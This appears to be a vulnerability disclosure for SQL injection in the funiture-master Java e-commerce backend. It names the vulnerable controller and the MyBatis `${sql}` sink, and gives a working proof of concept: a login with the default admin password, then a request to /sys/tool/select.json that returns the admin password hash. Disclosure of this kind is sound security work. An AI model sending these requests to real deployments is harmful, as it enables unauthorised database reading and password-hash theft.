# funiture Backend SQL Injection (Arbitrary SQL Execution)

## Introduction to Vulnerabilities

The backend tool interfaces `/sys/tool/select.json` and `/sys/tool/update.json` of the open-source Java e-commerce system **funiture-master** (Spring MVC + MyBatis) are vulnerable to SQL injection. The user-supplied `sql` parameter is directly concatenated into SQL via MyBatis `${sql}` with no parameterization or filtering, allowing execution of arbitrary SQL statements.

## Affected Versions

funiture-master (`com.app:funiture`, pom version `1.0.0`, Spring MVC + MyBatis, deployed on Tomcat)

## Utilize conditions

- Target reachable at `http://127.0.0.1:8088`
- A root session is required (default account `admin`, password `123456`)

## Vulnerability Reproduction

**Source (user input point)** — `sql` parameter accepted and passed through:

```java
// com/app/mvc/acl/controller/SysToolController.java
@ResponseBody
@RequestMapping(value = "/select.json")
public JsonData select(@RequestParam("sql") String sql) { ... }

@ResponseBody
@RequestMapping(value = "/update.json")
public JsonData update(@RequestParam("sql") String sql) { ... }
```

![image-20260813195351352](https://github.com/fangtang7/picx-images-hosting/raw/master/funiture/image-20260813195351352.6po8g7o6qh.webp)

**Sink** — `${sql}` string concatenation in MyBatis mapper, no parameterization:

```java
// com/app/mvc/acl/dao/SysToolDao.java
@Select("${sql}")  List<Map> executeSelect(@Param("sql") String sql);
@Update("${sql}")  void executeUpdate(@Param("sql") String sql);
```

![image-20260813195415340](https://github.com/fangtang7/picx-images-hosting/raw/master/funiture/image-20260813195415340.8s4149nde0.webp)

Step 1 - Login to obtain a root session:

```
POST /login.do HTTP/1.1
Host: 127.0.0.1:8088
Content-Type: application/x-www-form-urlencoded

username=admin&password=123456
```

```
HTTP/1.1 302
Set-Cookie: _U=9c0Mk$%S9mD&YubT8sYpLi#2E81BFC6@...uIml&8k#pI92*Qr; _UN=admin
Location: /admin/page.do
```

![image-20260813194129237](https://github.com/fangtang7/picx-images-hosting/raw/master/funiture/image-20260813194129237.7zr5mj75xw.webp)

Step 2 - Execute arbitrary SQL (read admin password hash):

```
POST /sys/tool/select.json HTTP/1.1
Host: 127.0.0.1:8088
Content-Type: application/x-www-form-urlencoded
Cookie: _U=9c0Mk$%S9mD&YubT8sYpLi#2E81BFC6@...uIml&8k#pI92*Qr; _UN=admin

sql=SELECT+username%2Cpassword+FROM+sys_user+WHERE+username%3D%27admin%27
```

```
HTTP/1.1 200
{"ret":true,"data":[{"password":"E10ADC3949BA59ABBE56E057F20F883E","username":"admin"}]}
```

![image-20260813194448461](https://github.com/fangtang7/picx-images-hosting/raw/master/funiture/image-20260813194448461.8vnn1zhbdf.webp)

## Impact

 arbitrary SQL execution -> full database read/write, password-hash theft, persistent backdoor, escalation to root. 
